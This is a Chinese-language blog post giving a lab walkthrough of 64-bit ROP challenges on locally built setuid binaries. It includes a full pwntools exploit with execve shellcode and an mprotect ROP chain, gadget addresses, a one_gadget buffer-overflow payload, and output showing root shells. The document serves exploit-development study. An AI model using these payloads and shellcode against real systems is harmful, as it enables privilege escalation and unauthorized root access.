---
layout: post
title: OneGadget与获取maps运行权限
excerpt: "64位系统下的ROP"
categories: [知识总结]
comments: true
---

参考地址:https://blog.techorganic.com/2015/10/09/a-rop-primer-solution-64-bit-style/

所需文件在:attachment/ROP for 64bit.zip

首先做如下操作
```bash
# mkdir 0 1 2
# echo 'flag{challenge-completed}' > flag
# chmod 600 flag
# cp level0 flag 0
# cp level1 flag 1
# cp level2 flag 2
# chown -R root:root 0 1 2
# chmod 4755 0/level0
# chmod 4755 1/level1
```
让文件结构如下:
```
# tree -p .
.
├── [drwxr-xr-x]  0
│   ├── [-rw-------]  flag
│   └── [-rwsr-xr-x]  level0
├── [drwxr-xr-x]  1
│   ├── [-rw-------]  flag
│   └── [-rwxr-xr-x]  level1
└── [drwxr-xr-x]  2
    ├── [-rw-------]  flag
    └── [-rwsr-xr-x]  level2
```
并且在challenges 0和1 中,ASLR是开启状态的

#### level0:给maps运行权限
根据rax指针和rbp地址计算出offset
```
RAX: 0x7fffffffe4d0 --> 0x31313131 ('1111')
RBP: 0x7fffffffe4f0

offset = 0x7fffffffe4f0 - 0x7fffffffe4d0 +8 = 40
```
查看权限
```
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x004b4000         r-xp	/root/sploitfun/64/0/level0
0x006b4000         0x006b6000         rw-p	/root/sploitfun/64/0/level0
0x006b6000         0x006db000         rw-p	[heap]
0x00007ffff7ffb000 0x00007ffff7ffd000 rw-p	mapped
0x00007ffff7ffd000 0x00007ffff7fff000 r-xp	[vdso]
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```
查看myprotect函数
```bash
gdb-peda$ disass mprotect 
Dump of assembler code for function mprotect:
   0x0000000000431f50 <+0>:	mov    eax,0xa
   0x0000000000431f55 <+5>:	syscall 
   0x0000000000431f57 <+7>:	cmp    rax,0xfffffffffffff001
   0x0000000000431f5d <+13>:	jae    0x4345c0 <__syscall_error>
   0x0000000000431f63 <+19>:	ret    
End of assembler dump.
```
我们可以通过syscall函数,使mapped地址段具有读写运行的权限,然后再向其中写入shellcode,再运行

exp如下
```
#coding= utf-8
from pwn import *

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" #27
payload = ""
payload+=shellcode
payload += "A"*13

#使0x7ffffffde000 具体有读写运行权限
# mprotect:
#   rax: 0xa
#   rdi: unsigned long start
#   rsi: size_t len
#   rdx: unsigned long prot

payload += p64(0x40159b)        # pop rdi; ret;
payload += p64(0x7ffffffde000)        # unsigned long start,第一个参数
payload += p64(0x432f29)        # pop rdx; pop rsi; ret;
payload += p64(7)               # unsigned long prot,第二个参数
payload += p64(135168)            # size_t len,第三个参数
payload += p64(0x414796)        # add eax, 5; ret;      这两行是将rax设置为0xa
payload += p64(0x414796)        # add eax, 5; ret;
payload += p64(0x4546b5)        # syscall; ret;         调用syscall,
payload += p64(0x7fffffffe490)        # return to read-in shellcode

r = remote("127.0.0.1",4000)
raw_input('#')
r.sendline(payload)

r.interactive()
```
查看mapped权限,目标地区已有读写和运行权限
```
more /proc/30564/maps
00400000-004b4000 r-xp 00000000 fd:00 1400868                            /root/sploitfun/64/0/level0
006b4000-006b6000 rw-p 000b4000 fd:00 1400868                            /root/sploitfun/64/0/level0
006b6000-006db000 rw-p 00000000 00:00 0                                  [heap]
7ffff7ffb000-7ffff7ffd000 rw-p 00000000 00:00 0 
7ffff7ffd000-7ffff7fff000 r-xp 00000000 00:00 0                          [vdso]
7ffffffdd000-7ffffffff000 rwxp 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```
运行结果
```bash
python exp.py 
[+] Opening connection to 127.0.0.1 on port 4000: Done
#
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```
#### levle1
使用的ROP,这里不做了,相似的见:https://snappyjack.github.io/articles/2019-11/%E9%80%9A%E8%BF%87GOT-overwrite-%E5%92%8CGOT-dereference%E7%BB%95%E8%BF%87ASLR

#### level2:使用OneGadget

项目地址:https://github.com/david942j/one_gadget

查找libc中的OneGadget
```bash
one_gadget /lib64/libc.so.6
0x43108 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4315c execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xe8a7f execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xe98bb execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

```
查找libc的基地址
```
more /proc/21546/maps
00400000-00401000 r-xp 00000000 fd:00 68505460                           /root/sploitfun/64/2/level2
00600000-00601000 rw-p 00000000 fd:00 68505460                           /root/sploitfun/64/2/level2
7ffff7a0d000-7ffff7bd0000 r-xp 00000000 fd:00 3001855                    /usr/lib64/libc-2.17.so
7ffff7bd0000-7ffff7dd0000 ---p 001c3000 fd:00 3001855                    /usr/lib64/libc-2.17.so
7ffff7dd0000-7ffff7dd4000 r--p 001c3000 fd:00 3001855                    /usr/lib64/libc-2.17.so
7ffff7dd4000-7ffff7dd6000 rw-p 001c7000 fd:00 3001855                    /usr/lib64/libc-2.17.so
```
计算得出one_gadget地址:0x7ffff7a50108‬


运行exp
```
gdb-peda$ r `python -c 'print "A"*40+"\x08\x01\xa5\xf7\xff\x7f"'`
Starting program: /root/sploitfun/64/2/level2 `python -c 'print "A"*40+"\x08\x01\xa5\xf7\xff\x7f"'`
[+] ROP tutorial level2
[+] Bet you can't ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?!
process 30313 is executing new program: /usr/bin/bash
[New process 30320]
process 30320 is executing new program: /usr/bin/python2.7
Missing separate debuginfos, use: debuginfo-install bash-4.2.46-33.el7.x86_64
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
[Inferior 2 (process 30320) exited with code 01]
Warning: not running
Missing separate debuginfos, use: debuginfo-install python-2.7.5-86.el7.x86_64
gdb-peda$  H localhost.localdomain  root  ~ | sploitfun | 64 | 2  uid=0(root) gid=0(root) 组=0(root)
```
